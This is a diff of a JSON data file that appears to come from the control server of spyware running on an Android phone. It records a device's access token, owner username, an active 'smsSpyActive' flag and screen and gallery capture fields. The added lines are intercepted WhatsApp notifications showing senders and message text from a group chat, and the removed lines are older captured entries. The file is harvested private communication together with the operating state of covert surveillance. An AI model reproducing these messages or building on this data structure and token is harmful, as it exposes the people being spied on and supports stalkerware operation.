@@ -108,7 +108,7 @@
     "deviceName": "HP-RASKA321-52A8",
     "ownerUsername": "Amsal.sim",
     "token": "906fc9b5e5fd7ed9167409d9979fb58b",
-    "lastSeen": 1776003684084,
+    "lastSeen": 1776003688035,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-11T16:02:07.690Z",
@@ -124,6 +124,46 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨 (6 pesan): ~ Who?",
+        "content": "Iye anjer tp udalah mau gmn lagi",
+        "time": "12/04 21:21",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003688216
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨",
+        "content": "‎5 pesan baru",
+        "time": "12/04 21:21",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003685052
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨",
+        "content": "‎4 pesan baru",
+        "time": "12/04 21:21",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003684970
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨 (4 pesan): ~ ?",
+        "content": "💟 Stiker",
+        "time": "12/04 21:21",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003684963
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨 (5 pesan): ~ ~`lova",
+        "content": "ya dehh",
+        "time": "12/04 21:21",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003684956
+      },
       {
         "appName": "WhatsApp",
         "sender": "𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨",
@@ -4083,46 +4123,6 @@
         "time": "12/04 08:12",
         "pkg": "com.whatsapp",
         "receivedAt": 1775956369470
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Mengunduh 1 video",
-        "content": "dari ALL MENTAHAN KKHANLUVYU",
-        "time": "12/04 08:12",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775956368464
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Mengunduh 1 video",
-        "content": "dari ALL MENTAHAN KKHANLUVYU",
-        "time": "12/04 08:12",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775956367466
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Mengunduh 1 video",
-        "content": "dari ALL MENTAHAN KKHANLUVYU",
-        "time": "12/04 08:12",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775956364306
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Mengunduh 1 video",
-        "content": "dari ALL MENTAHAN KKHANLUVYU",
-        "time": "12/04 08:12",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775956362504
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Mengunduh 1 video",
-        "content": "dari ALL MENTAHAN KKHANLUVYU",
-        "time": "12/04 08:12",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775956359138
       }
     ],
     "galleryPhotos": [],
